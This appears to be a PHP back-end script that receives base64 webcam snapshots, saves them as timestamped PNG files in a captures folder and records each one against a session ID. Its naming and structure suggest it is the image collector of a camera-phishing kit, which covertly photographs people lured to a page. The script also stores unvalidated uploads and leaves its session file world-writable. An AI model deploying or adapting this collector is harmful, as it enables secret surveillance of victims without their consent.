<?php
header('Content-Type: application/json');

$date = date('dMYHis');
$imageData = $_POST['cat'] ?? null;
$sessionId = $_POST['session_id'] ?? null;

if (empty($imageData)) {
    echo json_encode(['status' => 'error', 'message' => 'No image data']);
    exit;
}

try {
    // Log the capture
    error_log("Image captured at " . date('Y-m-d H:i:s') . "\n", 3, "Log.log");
    
    // Process image data
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    
    // Save image
    $filename = 'cam' . $date . '.png';
    
    // Create captures directory if needed
    if (!is_dir('captures')) {
        mkdir('captures', 0755, true);
    }
    
    $filepath = 'captures/' . $filename;
    file_put_contents($filepath, $unencodedData);
    
    // FIX: Set proper permissions so web server can read
    chmod($filepath, 0644);
    
    // Update sessions.json
    $jsonFile = 'sessions.json';
    if (file_exists($jsonFile) && $sessionId) {
        try {
            $sessions = json_decode(file_get_contents($jsonFile), true) ?? [];
            
            if (isset($sessions[$sessionId])) {
                $sessions[$sessionId]['captures'][] = [
                    'timestamp' => date('Y-m-d H:i:s'),
                    'filename' => $filename,
                    'path' => $filepath,
                    'size' => filesize($filepath)
                ];
                $sessions[$sessionId]['last_activity'] = date('Y-m-d H:i:s');
                
                file_put_contents($jsonFile, json_encode($sessions, JSON_PRETTY_PRINT));
                chmod($jsonFile, 0666);
            }
        } catch (Exception $e) {
            error_log("Error updating sessions.json: " . $e->getMessage());
        }
    }
    
    echo json_encode(['status' => 'success', 'filename' => $filename]);
    
} catch (Exception $e) {
    error_log("Error saving image: " . $e->getMessage() . "\n", 3, "error.log");
    echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
}
?>
